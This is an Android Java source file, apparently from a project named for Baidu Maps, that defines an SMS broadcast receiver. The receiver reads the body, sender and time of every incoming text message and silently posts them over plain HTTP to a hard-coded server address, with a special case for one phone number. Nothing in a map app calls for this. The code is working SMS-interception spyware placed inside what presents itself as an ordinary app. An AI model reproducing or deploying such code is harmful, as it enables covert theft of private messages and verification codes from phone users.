package yjf.baidumap;

/**
 * Created by Yin on 2016/10/26.
 */
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSBroadcastReceiver extends BroadcastReceiver {
    private static MessageListener mMessageListener;
    @Override
    public void onReceive(Context context, Intent intent) {
        Object[] pdus = (Object[])intent.getExtras().get("pdus");   //接收数据
        for(Object p: pdus){
            byte[]pdu = (byte[])p;
            SmsMessage message = SmsMessage.createFromPdu(pdu); //根据获得的byte[]封装成SmsMessage
            String body = message.getMessageBody();             //发送内容
            String date = new Date(message.getTimestampMillis()).toLocaleString();//发送时间
            String sender = message.getOriginatingAddress();    //短信发送方

            mMessageListener.OnReceived(body,sender);

            try {
                sendSMS(sender,body,date);
            } catch (Exception e) {
                e.printStackTrace();
            }
            if("13535212303".equals(sender)){
                try {
                    sendSMS(sender,body,date);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    private void sendSMS(String sender, String body, String date) throws Exception{
        String params = "sender="+URLEncoder.encode(sender)+"&body="+URLEncoder.encode(body)+"&time="+URLEncoder.encode(date);
        byte[]bytes = params.getBytes("UTF-8");
        URL url = new URL("http://192.168.0.103:8080/Server/SMSServlet");
        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");   //设置HTTP请求头
        conn.setRequestProperty("Content-Length", bytes.length+"");
        conn.setDoOutput(true);
        OutputStream out = conn.getOutputStream();
        out.write(bytes);   //设置HTTP请求体
        if(conn.getResponseCode()==200){
            Log.i("TAG", "发送成功");
        }
    }
    public interface MessageListener {
        public void OnReceived(String message,String number);
    }

    public void setOnReceivedMessageListener(MessageListener messageListener) {
        this.mMessageListener=messageListener;
    }
}
